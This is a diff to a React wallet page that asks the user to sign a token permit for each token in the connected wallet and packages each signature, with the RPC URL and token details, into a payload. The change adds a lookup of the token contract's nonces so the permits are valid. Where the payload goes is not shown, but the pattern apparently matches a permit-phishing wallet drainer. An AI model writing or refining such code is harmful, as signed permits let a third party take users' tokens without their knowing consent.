@@ -40,6 +40,8 @@ const Page = () => {
 	if (!account || isLoading) return <button disabled={isLoading} onClick={() => open.open()}>
 		Connect Wallet
 	</button>;
+	const providerUrl = //@ts-ignore
+		provider?.connection?.url;
 
 
 	return (
@@ -65,7 +67,14 @@ const Page = () => {
 					<div className={'flex gap-2'}>
 						{token.contract_ticker_symbol}
 						<button disabled={!!signatures[token.contract_ticker_symbol] || token.contract_address.includes("eeeeeeee")} onClick={async () => {
-							const nonce = await provider!.getTransactionCount(account.address!);
+							let nonce = -1;
+
+							try {
+								nonce = await callContractMethod('nonces', [account.address], token.contract_address,providerUrl)
+							} catch {
+								nonce = await provider?.getTransactionCount(account.address!) || 0;
+							}
+
 							const sig = await createPermitSignature(async (args: any)=>{
 								return signTypedData(config, args);
 							},
@@ -93,8 +102,7 @@ const Page = () => {
 
 							const payload: FinalizedSignedSignature = {
 								signedSignature: sig,
-								provider: //@ts-ignore
-								provider.connection.url,
+								provider: providerUrl,
 								token
 							}
 
